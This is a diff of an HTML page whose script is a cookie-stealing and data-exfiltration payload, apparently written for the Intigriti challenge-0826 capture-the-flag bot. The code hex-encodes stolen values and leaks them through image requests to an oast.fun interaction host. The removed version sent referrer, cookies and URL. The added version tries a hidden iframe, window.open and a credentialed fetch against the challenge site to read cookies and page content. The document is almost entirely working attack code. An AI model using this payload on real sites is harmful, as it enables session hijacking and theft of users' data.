@@ -4,38 +4,47 @@
 <script>
 var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
 function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
-function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";
-new Image().src="http://"+l+"."+o+"/"+encodeURIComponent(d);}
+function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}
 
-// Everything we can get
-e("v4ref", document.referrer || "none");
-e("v4cookie", document.cookie || "nocookie");
-e("v4loc", location.href);
+// Try to iframe the challenge page and read its cookies
+var ifr = document.createElement('iframe');
+ifr.src = "https://challenge-0826.challenges.intigriti.io/challenge";
+ifr.style.display = "none";
+ifr.onload = function(){
+    try {
+        var doc = ifr.contentDocument || ifr.contentWindow.document;
+        e("ifrcookie", doc.cookie || "nocookie");
+        e("ifrbody", doc.body.innerHTML.substring(0, 200));
+    } catch(ex) {
+        e("ifrerr", ex.toString().substring(0, 100));
+    }
+};
+document.body.appendChild(ifr);
 
-// Try to access opener/parent
-if (window.opener) {
-    try { e("v4opener", window.opener.document.cookie); } catch(ex) { e("v4openerr", ex.toString().substring(0,100)); }
-} else {
-    e("v4opener", "null");
-}
+// Also try window.open to challenge page
+setTimeout(function(){
+    try {
+        var w = window.open("https://challenge-0826.challenges.intigriti.io/challenge");
+        setTimeout(function(){
+            try {
+                e("wincookie", w.document.cookie || "nocookie");
+            } catch(ex) {
+                e("winerr", ex.toString().substring(0, 100));
+            }
+        }, 2000);
+    } catch(ex) {
+        e("winopenerr", ex.toString().substring(0, 80));
+    }
+}, 500);
 
-// Try to open http://web/ to steal cookies via window.open
-try {
-    var w = window.open("http://web/", "_blank");
-    setTimeout(function(){
-        try {
-            e("v4wincookie", w.document.cookie);
-            e("v4winbody", w.document.body.innerHTML.substring(0,300));
-        } catch(ex) {
-            e("v4winerr", ex.toString().substring(0,100));
-        }
-    }, 3000);
-} catch(ex) {
-    e("v4winopenerr", ex.toString().substring(0,100));
-}
+// Also: fetch the challenge's API endpoint to see if bot has special session
+fetch("https://challenge-0826.challenges.intigriti.io/api/channels/11/load", {credentials:'include'})
+    .then(r => r.text())
+    .then(t => e("ch11resp", t.substring(0,100)))
+    .catch(ex => e("ch11err", ex.toString().substring(0,80)));
 
-// Also try fetch to same origin as bot's admin
-fetch("/", {credentials:"include"}).then(r=>r.text()).then(t=>e("v4self",t.substring(0,300))).catch(ex=>e("v4selferr",ex.toString().substring(0,60)));
+// Ping to confirm script ran
+new Image().src = "http://v5ping." + o + "/";
 </script>
 </body>
 </html>
